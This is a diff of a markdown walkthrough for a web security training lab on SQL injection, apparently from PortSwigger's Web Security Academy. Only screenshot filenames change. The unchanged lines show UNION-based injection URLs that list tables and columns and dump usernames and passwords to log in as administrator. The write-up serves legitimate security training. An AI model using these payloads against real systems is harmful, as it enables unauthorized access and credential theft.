@@ -18,7 +18,7 @@ https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?categor
 https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,table_name+FROM+information_schema.tables+WHERE+table_schema='public'--+-
 ```
 
-![[attachments/sqli-lab-5/file-20260204103336065.png]]
+![[attachments/sqli-lab-5/file-20260206135416484.png]]
 
 4. Now use the following request to get the column names
 
@@ -26,7 +26,7 @@ https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?categor
 https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name='users_kzkmxb'--+-
 ```
 
-![[attachments/sqli-lab-5/file-20260204103553987.png]]
+![[attachments/sqli-lab-5/file-20260206135416487.png]]
 
 5. Send the following request to get the usernames and passwords
 
@@ -34,7 +34,7 @@ https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?categor
 https://0a8200c503d6972c842eb5e200e900aa.web-security-academy.net/filter?category=Pets'+UNION+SELECT+username_asuavr,password_nznlbv+FROM+users_kzkmxb--+-
 ```
 
-![[attachments/sqli-lab-5/file-20260204103746857.png]]
+![[attachments/sqli-lab-5/file-20260206135416488.png]]
 
 6. Log in as the administrator to solve the lab
 
